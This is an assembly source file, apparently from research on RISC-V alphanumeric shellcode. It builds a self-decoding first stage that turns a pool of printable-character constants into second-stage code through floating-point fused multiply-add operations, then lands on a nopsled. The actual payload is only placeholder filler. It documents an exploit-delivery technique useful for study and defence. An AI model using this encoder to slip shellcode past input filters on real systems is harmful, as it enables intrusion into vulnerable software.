/*#
 *# (c) 2018-2019 Hadrien Barral
 *# SPDX-License-Identifier: Apache-2.0
 */

include(`../scripts/common.m4')#'

#define XP sp
#define CONSTR ft4
.macro dangerous_nop2
    li     t1,-2
.endm

#ifndef COMPUTE_XP_FIXUP
/*# Defines 'xp_fixup' and 'end_nopsled' */
#include "xp_fixup.S"
#endif

.global _start
_start:
    # NON-ALNUM gadget: Enable FP extensions
    li     t2, 0x2000
    csrw mstatus, t2

step0:
    .word 0x2730276F /*# This is the minimal 'jal reg, step1'. reg is 'a4' */

/*# Note: stage2 pool is currently built by hand. This could be improved. */
stage2_pool:
#define NULLDW 0x4242424242424242
    .8byte NULLDW
    .8byte NULLDW
    .8byte NULLDW
    .8byte NULLDW
    .8byte NULLDW
    .8byte NULLDW
    .8byte 0x4261447a6f314233 #  48 # ADD_3A
    .8byte 0x42627073717a5a42 #  56 # ADD_1B
    .8byte NULLDW
    .8byte NULLDW
    .8byte 0x4261706e69633436 #  80 # ADD_2A
    .8byte NULLDW
    .8byte NULLDW
    .8byte 0x4261447a31356775 # 104 # ADD_3B
    .8byte 0x413166346e514956 # 112 # MUL_2
    .8byte 0x426132356a4b6e31 # 120 # ADD_2B
    .8byte NULLDW
    .8byte NULLDW
    .8byte NULLDW
    .8byte NULLDW
    .8byte 0x4131706f64596870 # 160 # MUL_4
    .8byte 0x4261336f596c5239 # 168 # ADD_4A
    .8byte 0x4131352778497450 # 176 # MUL_3
    .8byte 0x4131567a47714b4d # 184 # MUL_1
    .8byte NULLDW
    .8byte NULLDW
    .8byte NULLDW
    .8byte NULLDW
    .8byte NULLDW
    .8byte NULLDW
    .8byte 0x4131555555555555 # 240  # FIX
    .8byte 0x426358466535524c # 248  # ADD_1A

payload_pool:
    repeat(5303, {.half 0x4242})

step1: /*# Move 'link' register to XP */
    sra      s4, zero, s3 /*# s4 := 0 */
    sra      XP, a4, s4   /*# XP := a4 */

step2:
                     #Role   [Can]
    fld fa0,  48(XP) #ADD_3A [AM]
    fld fa2,  56(XP) #ADD_1B [AM]
    fld fa4,  80(XP) #ADD_2A [AM]
    fld fa6, 112(XP) #MUL_2  [ M]
    fld fs0, 120(XP) #ADD_2B [AM]
    fld fs2, 176(XP) #MUL_3  [ M]
    fld ft2, 184(XP) #MUL_1  [ M]
    fld ft4, 240(XP) #FIX    [ M]
    fld ft6, 248(XP) #ADD_1A [AM]
   #fld ft0, 296(XP) #       [ M]

step3: /*# Fixup XP (Need to have 'XP == step6') */
    #ifndef COMPUTE_XP_FIXUP
    xp_fixup
    #endif

step4: /*# Write stage2 */
.macro next_block
    /*# 'addi XP,XP,16', but gas chooses another non-alnum encoding */
    .short 0x6141
.endm
.macro fblock op, dstr, mulr, addr, store_offset, round=rup
    fm\op\().d \dstr, \mulr, CONSTR, \addr, \round
    fsd     \dstr, \store_offset(XP)
.endm
    fblock  add, ft6, ft2, ft6, 1952
    fblock  add, ft6, ft2, fa2, 1958

    fblock  sub, ft6, fa6, fa4, 1964
    fblock  sub, ft6, fa6, fs0, 1970

    next_block

    fld fa2, 104(a4) #ADD_3B [AM]
    fld fa4, 160(a4) #MUL_4  [AM]
    fld fa1, 168(a4) #ADD_4A [A ]
   #fld fa3, 224(a4) #       [A ]
   #fld fs1, 232(a4) #       [A ]

    fblock  sub, ft6, fs2, fa0, 1960
    fblock  sub, ft6, fs2, fa2, 1966

    fblock  sub, ft6, fa4, fa1, 1970
    #fblock  add, ft6, fa4, fa3, 19xx

step5: /*# Nopsled to make up for loose ends. */
    #ifndef COMPUTE_XP_FIXUP
    end_nopsled
    #endif

step6: /*# Stage 2 will be decoded here */
    csrc  mip,sp
.global end
end:
